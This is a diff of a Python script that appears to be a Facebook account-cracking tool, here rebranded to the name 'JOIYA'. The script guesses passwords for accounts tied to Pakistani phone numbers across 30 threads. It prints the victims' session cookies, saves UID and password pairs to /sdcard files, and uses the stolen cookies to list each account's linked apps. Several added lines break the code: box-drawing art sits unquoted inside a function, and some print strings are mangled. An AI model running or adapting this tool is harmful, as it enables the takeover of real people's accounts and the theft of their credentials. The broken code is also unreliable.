@@ -70,9 +70,13 @@ twf = []
 def clear():
     os.system('clear')
     print(logo)
+    ╔╦═╦╗╔═╗╔╗─╔══╗
+║║║║║║║║║║─║═╦╝
+║║║║║║║║║╚╗║╔╝─
+╚═╩═╝╚═╝╚═╝╚╝──
 logo =f"""____________________
-AUTHOR    : à¼„ð˜ªð˜µð˜´à¼† â˜¦ï¸Žð“ð“šð“ð“¢ð“—à¼† ð˜©ð˜¢ð˜¤ð˜¬ð˜¦ð˜³âžª
-FACEBOOK : â˜¦ï¸Žð“˜ð“£ð“¢ ð“ð“šð“ð“¢ð“—à¼†
+AUTHOR    : JOIYA
+FACEBOOK : ABDUL GHAFFAR 
 VERSION    : 1.1
                                    [THE DEAD USER]
 ____________________"""
@@ -89,11 +93,11 @@ def checks(oks,cps,twf):
     if not len(oks) != 0:
         pass
     if len(cps) != 0:
-        print('\n\n\x1b[1;97m à¼„ð˜ªð˜µð˜´à¼† OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
+        print('\n\n\x1b[1;97m  OK : \x1b[1;97m\x1b[1;97mKB-OK.txt' % (
             H, P, str(len(oks))))
-        print('\x1b[1;97m à¼„ð˜ªð˜µð˜´à¼† CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
+        print('\x1b[1;97m CP :\x1b[1;97m\x1b[1;97mKB-CP.txt' %
               (H, P, str(len(cps))))
-        print('\x1b[1;97m à¼„ð˜ªð˜µð˜´à¼† 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
+        print('\x1b[1;97m  2F :\x1b[1;97m\x1b[1;97mKB-2F.txt' %
               (H, P, str(len(twf))))
         input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
         xyz()
@@ -107,23 +111,23 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
+        print(f'\{ORANGE}SORRY THERE IS NO ACTIVE  APKS (ORANGE))
     else:
         print(f'\r {GREEN}[âˆš] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
         for i in range(len(game)):
-            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            print(f"\(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+            #print(f'] Sorry, Apk check failed invalid cookie'%(N,M,N))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
+        print(f'{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
     else:
-        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
+        print(f'{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
         for i in range(len(game)):
-            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
+            print(f"(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
             print(f"{GREEN}[âˆš]---------------------------------------------------[âˆš]")
     #____________#
 def xyz():
@@ -180,7 +184,7 @@ def Random():
     with ThreadPool(max_workers=30) as yaari:    
         clear()
         tl = str(len(user))
-        print(f" {WHITE}à¼„ð˜ªð˜µð˜´à¼† IDZ             : {RED}"+tl)
+        print(f" {WHITE}JOIYA_IDZ             : {RED}"+tl)
         print(f" {WHITE}COUNTRY YOU CHOOSE    : PAKISTAN ")
         print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
         print(f" {WHITE}PROCESS HAS BEEN STARTED")
@@ -232,15 +236,15 @@ def free(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\033[1;32m[âˆš]---------------------[JADU-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                 cek_apk(session,coki)
-                open('/sdcard/â˜¦ï¸Žð“ð“šð“ð“¢ð“—à¼†-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JOIYA-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[Ã—]--------------------[JADU-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
-                open('/sdcard/â˜¦ï¸Žð“ð“šð“ð“¢ð“—à¼†-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print(f'\r{Red}[Ã—]--------------------[JOIYA-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
+                open('/sdcard/JOIYA-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -248,12 +252,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/â˜¦ï¸Žð“ð“šð“ð“¢ð“—à¼†-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JOIYA-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[â˜¦ï¸Žð“ð“šð“ð“¢ð“—à¼†] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[JOIYA] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
